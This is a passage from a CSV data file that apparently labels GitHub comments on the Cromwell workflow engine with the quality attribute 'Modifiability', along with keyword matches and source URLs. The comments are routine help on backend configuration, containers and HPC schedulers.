Modifiability,"Hello and thanks for the issue. Server mode does not accept command line arguments, rather its behavior is driven by config file. When printing the command line help, the CLI args should be indented under the `Command: run [options] workflow-source` heading. For more information on persisting metadata in a database with server mode, please see https://cromwell.readthedocs.io/en/stable/Configuring/#database",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595:117,config,config,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595,2,"['Config', 'config']","['Configuring', 'config']"
Modifiability,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:319,adapt,adapt,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053,1,['adapt'],['adapt']
Modifiability,"Hello, does anyone tried to implement a Job Array with LSF scheduler within Cromwell?. I am adapting my pipeline (that uses job array and the LSF scheduler) written in bash for Cromwell. To be sure that every task runs smoothly I have used only 1 sample and everything seems to work fine. Now I would like to create a job array with multiple samples, e.g. given a file with a list of unique ID (as I usually do in bash with LSF scheduler). Can anyone share his/her own experience?. Thanks in advance!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513844087:92,adapt,adapting,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513844087,1,['adapt'],['adapting']
Modifiability,"Hello, the cromwell team use a [JIRA](https://broadworkbench.atlassian.net/projects/BA/issues) now to triage issues - I'm as much of a fan of it as you are. 👎. My suggestion would be to use the the workflow options json to configure your workflow at runtime.; See here: https://cromwell.readthedocs.io/en/stable/wf_options/Overview/. This would extend your curl command with; `-F ""workflowOptions=@options.json""`. This may be a parameter however that needs to be set in the configuration file that is read by the server when it is launched. Alexis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5511#issuecomment-675797428:223,config,configure,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5511#issuecomment-675797428,3,"['config', 'extend']","['configuration', 'configure', 'extend']"
Modifiability,"Here is an example for cromwell.conf backend for AWS-EFS or any shared mountable file system for AWSBATCH.; Please make sure you mount the EFS to /your-root on cromwell-server host and batch-computes.; One way of doing this automatically is thro' a LaunchTemplate. . backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""/your-root/cromwell_execution""; auth = ""default""; default-runtime-attributes { queueArn = ""xxxx"" }; filesystems { local { auth = ""default"" } }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837:407,config,config,407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837,1,['config'],['config']
Modifiability,"Here is the config file used for the above. ```; ﻿include required(classpath(""application"")). ""workflow_failure_mode"": ""ContinueWhilePossible"". webservice {; port = 2525; }. system.file-hash-cache=true. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; # driver = ""com.mysql.jdbc.Driver""; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://xxxxxx:xxxx/xxx?rewriteBatchedStatements=true&useSSL=false""; user = ""xxx""; password = ""xxx""; connectionTimeout = 120000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xx:role/xxx""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://xxx/cromwell-output""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020:12,config,config,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020,5,"['config', 'rewrite']","['config', 'configure', 'rewriteBatchedStatements']"
Modifiability,"Hey @OgnjenMilicevic, looks like there is an error in that page. I believe it's supposed to be `${docker_script}` instead of `${script}`. (Edit, I've opened a PR to address this). For context, here is my config I use for Slurm + Singularity: https://gist.github.com/illusional/b70f870fa0e2f8e7a0ba0a9e71d568f5",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5768#issuecomment-676817660:204,config,config,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5768#issuecomment-676817660,1,['config'],['config']
Modifiability,"Hey @Shenglai,. Although this isn't well documented, but for each scheduler based backend (such as SLURM), on has to configure the backend with the memory units required for the scheduler. And without this conversion, Cromwell doesn't assume what needs to be sent to the scheduler. I believe we just need to improve the documentation, but I do believe the intended behavior is that Cromwell always converts declared memory into bytes by default, and backends can be configured to use other units. . Let me know if you have any questions, and I'll be closing this issue (and replacing it with an issue to improve documentation) if there are no concerns. Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4080#issuecomment-439166849:117,config,configure,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4080#issuecomment-439166849,2,['config'],"['configure', 'configured']"
Modifiability,"Hey @TMiguelT @vsoch, we noticed that on a system without `mksquashfs` in its path, the `singularity exec` from Dockerhub fails. This seems to be backed up here: http://singularity.lbl.gov/install-linux. > Note that when you configure, squashfs-tools is not required, however it is required for full functionality. You will see this message after the configuration:; > `mksquashfs from squash-tools is required for full functionality`; > If you choose not to install squashfs-tools, you will hit an error when you try a pull from Docker Hub, for example. I get slightly conflicting information from the Singularity 3 docs which just says: ; > Note that squashfs-tools is an image build dependency only and is not required for Singularity build and run commands.; (https://www.sylabs.io/guides/3.0/user-guide/quick_start.html?highlight=squashfs). We did install `squashfs` and it's in our `$PATH`, but it seems Singularity is only looking at:; - `/bin/mksquashfs`; - `/usr/bin/mksquashfs`; - `/sbin/mksquashfs`; - `/usr/sbin/mksquashfs`; - `/usr/local/bin/mksquashfs`; - `/usr/local/sbin/mksquashfs`. Any thoughts here, as you are almost always required to pull from docker hub (it's kind of the default). ___. I also noticed with some testing that in the udocker submit, if you exclude the `--rm` it will run a bit quicker. @danbills, am I able to make changes since the review?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468087702:225,config,configure,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468087702,2,['config'],"['configuration', 'configure']"
Modifiability,"Hey @Xophmeister, sorry for the slow response time!. This error message is actually coming from our SFS (shared filesystem) backend (so I'll ping @kshakir). I'm not familiar with the `mounts` attribute in the SFS. However, I think the answer to your question is that none of the attributes asked for by the SFS backend are arrays, and so arrays are not a supported attribute type. . I actually could only find reference to the `mounts` attribute outside of the SFS backend in places like BCS and Google cloud. I wonder whether you just need to move this attribute out of your configuration file and into your WDL task itself?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411:576,config,configuration,576,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411,1,['config'],['configuration']
Modifiability,"Hey @antonkulaga, these aren't exactly what you're after but there are two things you could have a look at that should help:; - You can use the `concurrent-job-limit` for the local backend to limit how many jobs (i.e. calls being run) are happening at any given time. That should cause things to slow down naturally without having to manually pause/resume them, which might help. In the config:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```. - The second item (not re-running early tasks) should be helped by [call caching](https://github.com/broadinstitute/cromwell#call-caching). As long as nothing changes in the intermediate steps, Cromwell should be able to detect and re-use your previous results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527:387,config,config,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527,2,['config'],['config']
Modifiability,"Hey @asmoe4 . It would help to confirm that your Cromwell config contains a stanza that looks like:. ```; engine {; filesystems {; s3 {; auth = ""default""; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-448363051:58,config,config,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-448363051,1,['config'],['config']
Modifiability,"Hey @dirkpetersen - I'm going to close this PR for now since I think you identified a config option to achieve what you want without needing a code change. If you disagree, or the config option isn't what you needed, feel free to re-open the PR either as-is or slightly different.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-585269138:86,config,config,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-585269138,2,['config'],['config']
Modifiability,"Hey @gdlex4015 . We expect IO failures from time to time. There's a place in the Cromwell config to increate the number of retries on IO actions, so possibly bumping that up will help. . https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf#L721. Closing this for now but please re-open if you see this at a high frequency. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4439#issuecomment-466136579:90,config,config,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4439#issuecomment-466136579,1,['config'],['config']
Modifiability,"Hey @geoffjentry this is a great change to make, didn't make sense to have a non-changeable hardcoded default!. ToL: What struck me in this PR was that it took changing of 11 files to wire a default from the config file to where it is used. I struggled with this same thing when adding in the alternate compute service account. Felt like a lot of boilerplate. As a future refactoring, it would be nice if this was simplified overall",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-267824365:208,config,config,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-267824365,2,"['config', 'refactor']","['config', 'refactoring']"
Modifiability,"Hey @natechols, not part of broad team, but what does your config looks like for the SGE cluster. The `memory` variable gets turned into `memory_mb` or `memory_gb` in your runtime attributes which you can use to prepare the SGE job:. https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5530#issuecomment-637917807:59,config,config,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5530#issuecomment-637917807,2,"['config', 'variab']","['config', 'variable']"
Modifiability,"Hey @plsysu,. Cromwell doesn't take care of dependencies, it's usually managed via dockers. However, another option is to add something to the start of your command block that exports the JAVA_HOME variable to point to version 1.8. Maybe something like...; ```; command {; export JAVA_HOME=`/usr/libexec/java_home -v 1.8`; java -jar gatk.jar ...; }; ```. Hope that works!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4410#issuecomment-440495817:198,variab,variable,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4410#issuecomment-440495817,1,['variab'],['variable']
Modifiability,"Hey @rhpvorderman, your changes look fine to me. One thing I noticed is that we've used `${script}` when I believe it should actually be `${docker_script}` to get the container relevant path for the script. Can you confirm in your configurations?. Otherwise I'm happy to click approve from my side (if I'm allowed to do that?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630620299:231,config,configurations,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630620299,1,['config'],['configurations']
Modifiability,"Hey @vsoch, in our submit script, we're opting to pull and build our docker images on the head node as @TMiguelT suggested. If the build exists, singularity will ask to overwrite the existing build. Just wondering if there's an elegant way to skip the build if it exists (and it's up to date) or whether we should be forcing a rebuild every time. I could skip it like this, but it's not as friendly./; ```; echo 'n' | singularity build --sandbox $IMAGE docker://${docker}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463861596:438,sandbox,sandbox,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463861596,1,['sandbox'],['sandbox']
Modifiability,"Hey @ylipacbio, I'm not from Cromwell but wanted to throw out a comment. For Cromwell to pull files, a [_Filesystem_](https://cromwell.readthedocs.io/en/stable/filesystems/Filesystems/) needs to be implemented in Scala. . As far as I'm aware, Amazon's EFS is **NOT** implemented, and cannot be configured to work with Cromwell. The available filesystems are ftp, s3, demo-dos, gcs, oss, http (and unix). If you know some scala, [this](https://github.com/broadinstitute/cromwell/tree/develop/filesystems) might be good place to start on how to implement one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4602#issuecomment-489482319:294,config,configured,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4602#issuecomment-489482319,1,['config'],['configured']
Modifiability,"Hey everyone, I did manage to do some testing today (after some discussion with @TMiguelT as well). Some small notes about my setup:. - I'm using Singularity that has the ability to store and run an OCI container to/from a file.; - I have one place `/path/to/containers/*` where I store all my containers.; - I transform the container digest (returned by Cromwell as `${docker}`) to generate a filename and use that to uniquely reference the container (per this PR: #4797). Notes about my (slightly modified) config below:. - My `$image` var has slashes in it (because it's a path to a file) which isn't correct, as `flock` expects a valid path, so I've just used `$docker_subbed` which is the transformed docker file.; - I didn't have write permission to `/var/lock/$imagename`, I've opted instead for the container directory.; - I wanted the output of `flock` to be redirected to Cromwell's `stderr.submit`.; - I do the second image check for when the lock is released, the locked processes will find the image and skip the pull (per @rherban's [comment](https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509677104)); ```bash; # transformed docker digest; docker_subbed=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< ${docker}); # output path of container (.sif); image=/path/to/containers/$docker_subbed.sif; # declare a very similar path (.lock) where Cromwell can access; lockpath=/path/to/containers/$docker_subbed.lock . if [ ! -f ""$image"" ]; then # If we already have the image, skip everything; (; flock --verbose --exclusive 200 1>&2; if [ ! -f ""$image"" ]; then # do a second check once the lock has been released ; singularity pull ""$image"" docker://${docker}; fi; ) 200>/var/lock/$lockpath; fi; ```. Hope this helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637:509,config,config,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637,1,['config'],['config']
Modifiability,"Hey,. I am trying to use TESK as a backend for a cromwell server (version 51) just running a simple task to test if it works (echo ""Hello World"" using an alpine image) and it does not work. TESK receives the input from the server with the correct syntax, however, the script files and all other files generated by cromwell are pointing to a local directory which TESK does not have (TESK is running in a kubernetes cluster). Maybe I am missing something but I this behaviour with creating local files does not work with a kubernetes cluster. Can I change it by setting the config differently or what is a possible solution? Is there anyone who is experiences with Cromwell-TESK?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3928#issuecomment-654851201:573,config,config,573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3928#issuecomment-654851201,1,['config'],['config']
Modifiability,"Hi @DaveRidic - if you're in a server mode absolutely they can run in parallel. However note that there are configurable limits, e.g. https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf#L31. What backend are you using?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3860#issuecomment-422481001:108,config,configurable,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3860#issuecomment-422481001,1,['config'],['configurable']
Modifiability,"Hi @antonkulaga - you're right, and likely more than just Pairs. It's been a while since we've updated the plugin so it's not totally on board with newer WDL constructs at the moment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2246#issuecomment-299453584:107,plugin,plugin,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2246#issuecomment-299453584,1,['plugin'],['plugin']
Modifiability,"Hi @antonkulaga, your `application.conf` file is missing `--cidfile ${docker_cid}` inside submit-docker, which creates `docker_cid` file. So if you update your `submit-docker` to ""docker run --rm **--cidfile ${docker_cid}** -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"", it should work! You can look at Cromwell's default config for submit-docker [here](https://github.com/broadinstitute/cromwell/blob/e6c7704b9300db8852ae9ac7fbefe39ef6ba71d7/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34). Let me know if this doesn't work!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4011#issuecomment-418474050:336,config,config,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4011#issuecomment-418474050,1,['config'],['config']
Modifiability,"Hi @azzaea,. The AWS backend for Cromwell integrates with AWS Batch for job scheduling and execution. As such it pretty much only uses tasks that use Docker containers. My understanding is that Cromwell can be configured with multiple backends (e.g. AWS and FilesystemLocal) and that tasks can be parameterized via inputs to the workflow to choose which backend it runs on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502847475:210,config,configured,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502847475,2,"['config', 'parameteriz']","['configured', 'parameterized']"
Modifiability,"Hi @carbocation - the config files are in [HOCON](https://github.com/lightbend/config/blob/master/HOCON.md) which is a JSON superset. thus JSON is valid, but other forms are as well",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4913#issuecomment-487420609:22,config,config,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4913#issuecomment-487420609,2,['config'],['config']
Modifiability,Hi @carolynlawrence. Would a configuration option to remove this privilege re-assignment be sufficient to fix this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374695606:29,config,configuration,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374695606,1,['config'],['configuration']
Modifiability,"Hi @chapmanb - sorry for the delay in responding here. I was able to get http inputs to work in CWL against a default (ie no custom config specified) instance of Cromwell in server mode. The test case I used is in the linked PR (#4392). I wonder whether you could confirm:; - Whether this test case works for you, and if so:; - Is your use of HTTP inputs different somehow?; - How can I enhance my test case to cover whatever is different?; - Or, whether this test case does not work for you, and if so:; - We might try to work out what is different between your configuration and the default which might be breaking things",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-439193089:132,config,config,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-439193089,3,"['config', 'enhance']","['config', 'configuration', 'enhance']"
Modifiability,"Hi @cowmoo and @MatthewMah (I think, I know this came up recently and I think it was you). This PR goes beyond the scope of what we're comfortable with as it paints with a pretty broad brush. If either of you were interested in implementing something which retried job submission for the config backend only (e.g. SGE, SLURM, etc) we'd be interested in that. We'll likely get to it ourselves at some point but not immediately. If that's something either of you (or anyone else coming across this) are interested in let us know and we can point you in the right direction. It should be relatively straightforward.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296802795:288,config,config,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296802795,1,['config'],['config']
Modifiability,"Hi @doron-st Can you post your Cromwell config & how you set up your batch environment, e.g. via the cloud formation launch templates?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-484561317:40,config,config,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-484561317,1,['config'],['config']
Modifiability,"Hi @dshiga - unfortunately there's currently a limitation with PAPI, see what @kshakir wrote [here](https://github.com/broadinstitute/cromwell/issues/2461#issuecomment-316418026). It's expected that PAPI will overcome these limitations over the next couple of quarters and then we can change to be more flexible, but until then there's not much that we can do.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-324949866:303,flexible,flexible,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-324949866,1,['flexible'],['flexible']
Modifiability,"Hi @dspeck1 ,. Thank you for your immediate help! . I checked the `my-private-network` and `my-private-subnetwork` labels in my project (by running `gcloud projects describe` command), and neither of them has the trailing `/` (please see attached screenshot). And actually this same settings in `virtual-private-config` stanza worked with Genomics API in the past 3 years. Then recently when I migrate to GCP Batch, it broke. <img width=""387"" alt=""Screenshot 2024-08-20 at 14 21 36"" src=""https://github.com/user-attachments/assets/fed0f11d-e368-4842-80f9-3a7f99cf5b37"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299795626:312,config,config,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299795626,1,['config'],['config']
Modifiability,"Hi @dstreett - what you're seeing is an artifact of the fact that where the read API is reading from is separate from the internal database and it takes a moment for that propagation to happen. . You can improve the situation by tweaking the config setting `services.MetadataService.config.metadata-summary-refresh-interval`, the default is 2 seconds. However there'll always be a non-zero time differential there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2671#issuecomment-333909114:242,config,config,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2671#issuecomment-333909114,2,['config'],['config']
Modifiability,"Hi @ffinfo - thanks for contributing this!. My only concern as-is is that this has the potential to overload HPC clusters (see the discussions in https://github.com/broadinstitute/cromwell/issues/1499). In your case, since you're aware of the dangers and willing to go ahead regardless so I don't see why we shouldn't let you - but I don't think this should be the default behavior for unsuspecting users. . Would you be willing to make this a configurable option in the backend config (something like `check-alive-all-jobs`)?. Longer term if you start hitting HPC limits perhaps we can circle back round to the batching solutions hinted at in #1499",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-422877292:444,config,configurable,444,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-422877292,2,['config'],"['config', 'configurable']"
Modifiability,"Hi @ffinfo. I originally thought this was going to be a patch to just lower the rc polling verbosity, but you've begun tackling a much bigger issue. Thanks a bunch for your work so far!. We've also got a bunch of other work we're juggling at the moment, so it's unlikely I or others on the team will have time to look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra check",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:828,config,configuration,828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,1,['config'],['configuration']
Modifiability,"Hi @freeseek,. (replying here because this is the currently open issue). The message; ```; 400 Bucket is requester pays bucket but no user project provided.; ```; should be addressed by specifying your project in the config as described [here](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665234059:217,config,config,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665234059,1,['config'],['config']
Modifiability,"Hi @geoffjentry , so are the docs correct now? I'm trying to configure cromwell + local docker backend but so far failed to force it to recognize cup and memory. And I'm not sure is it my problem or general system restriction",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1030565838:61,config,configure,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1030565838,1,['config'],['configure']
Modifiability,"Hi @huangzhibo, thanks for your contribution! I have two comments:. ---. 1. I think this feature is OK if the cromwell owner wants to allow it, but not in all cases. ; - Eg if I'm hosting a Cromwell instance I might not want users to be able to specify an arbitrary location on my filesystem to write their workflow contents. ; - I want to allow others to comment on this rather than making any solid statements... personally I think at the very least we'd want to require an opt-in in the configuration to enable this - something like `""allow_workflow_specified_execution_root""`?. ---. 2. Could you consider adding a centaur test for this? This should help get you started:; - Have a look in `centaur/src/main/resources`; - Make a new test directory for the new test; - Add a workflow that can determine the workflow root - off the top of my head, maybe running `pwd` from within the `command` and selecting the workflow root from the output?; - Add a new workflow options file alongside the workflow file and use it to specify an execution root.; - Create a new `.test` file next to the others, and use it to specify your workflow and your workflow options as inputs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4379#issuecomment-438388028:490,config,configuration,490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4379#issuecomment-438388028,1,['config'],['configuration']
Modifiability,Hi @jainh - I don't really like this. What we tell users to do is to take the bits of config they want to override and put them in a separate file and to invoke cromwell with the `-Dconfig.file=....` flag. Aside: I notice that this isn't quite what it says in the [README](https://github.com/broadinstitute/cromwell#configuring-cromwell) but that's a separate topic which I'll address myself.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2043#issuecomment-285094026:86,config,config,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2043#issuecomment-285094026,2,['config'],"['config', 'configuring-cromwell']"
Modifiability,"Hi @jainh,. The runtime section is very backend-implementation specific, but to answer your question in the abstract:. The wdl spec [says](https://github.com/broadinstitute/wdl/blob/develop/SPEC.md#runtime-section) that ""Values can be any expression …"". For example:. Valid wdl string:; ```; runtime {; my_key: ""a 'b c' d""; }; ```. Valid wdl array:; ```; runtime {; my_key: [""a"", ""b c"", ""d""]; }; ```. The following however is **invalid** according to the spec as the keys are duplicated:; ```; runtime {; my_key: ""a""; my_key: ""b c""; my_key: ""d""; }; ```. It is then up to the backend to decide and implement what keys and values it will accept. The config backend is currently implemented to [only](https://github.com/broadinstitute/cromwell/blob/839ea1e456b929d6149430f4d7d3805f8c235d3f/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/DeclarationValidation.scala#L43-L50) support primitive wdl types (WdlInteger, WdlString, WdlFloat, WdlBoolean) and their optional wrappers. While it does not support them, one could update that code to support arrays of values too. Meanwhile, the JES backend already does support arrays for some 